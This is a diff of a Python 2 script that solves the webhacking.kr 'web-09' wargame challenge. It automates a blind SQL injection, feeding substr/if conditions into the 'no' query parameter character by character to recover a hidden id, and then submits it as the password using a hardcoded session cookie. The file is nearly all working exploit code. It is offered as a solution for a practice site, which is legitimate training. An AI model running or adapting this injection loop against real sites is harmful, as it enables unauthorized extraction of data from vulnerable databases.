@@ -1,29 +1,51 @@
 #-*- coding: utf-8 -*-
 import urllib2
 import CookieManager
+import sys
 
 challengeUrl = "http://webhacking.kr/challenge/web/web-09/index.php?no=if(substr(id,%d,1)in(%s),3,0)"
-answer = ""
+CookieManager.addCookie("PHPSESSID", "79d2e02ad592877ec33fb8651960469d")
+solution = ""
+
+print "[*] Find id"
 
 for caretIndex in range(1, 12):
-    for charIndex in range(ord('a'), ord('z')):
+    print
+    print "[*] Blind SQL Injection...", caretIndex, "", 
+
+    for charIndex in range(0x20, 0x7e):
+        sys.stdout.write(".")
         httpRequest = urllib2.Request(challengeUrl %(caretIndex, hex(charIndex)))
-        httpRequest.get_method = lambda: 'PUT'
-        CookieManager.addCookie("PHPSESSID=da0bd6cb852292c17cc2364c9dc6d334") # webhacking.kr에 로그인 하고 나온 cookie
         httpRequest.add_header("Cookie", CookieManager.getCookie())
         
-        httpResponse = urllib2.urlopen(httpRequest).read()
-        if str(httpResponse).find("Secret") != -1:
-            print "find[%02d] : %s" %(caretIndex, chr(charIndex))
-            answer += chr(charIndex)
-            break
+        httpConnection = None
+        try:
+            httpConnection = urllib2.urlopen(httpRequest)
+            httpResponse = httpConnection.read()
+            if str(httpResponse).find("Secret") != -1:
+                print 
+                print "[+] FIND IT!", chr(charIndex)
+                solution += chr(charIndex)
+                break
+        except:
+            raise
+        finally:
+            if httpConnection != None:
+                httpConnection.close()
 
-print answer
-challengeUrl = "http://webhacking.kr/challenge/web/web-09/index.php?pw=" + answer
+print "[!] password is [", solution, "]"
+
+challengeUrl = "http://webhacking.kr/challenge/web/web-09/index.php?pw=" + solution.lower()
 httpRequest = urllib2.Request(challengeUrl)
-httpRequest.get_method = lambda: 'PUT'
-CookieManager.addCookie("PHPSESSID=da0bd6cb852292c17cc2364c9dc6d334") # webhacking.kr에 로그인 하고 나온 cookie
 httpRequest.add_header("Cookie", CookieManager.getCookie())
 
-httpResponse = urllib2.urlopen(httpRequest).read()
-print httpResponse
+httpConnection = None
+try:
+    httpConnection = urllib2.urlopen(httpRequest)
+    httpResponse = httpConnection.read()
+    print httpResponse
+except:
+    raise
+finally:
+    if httpConnection != None:
+        httpConnection.close()
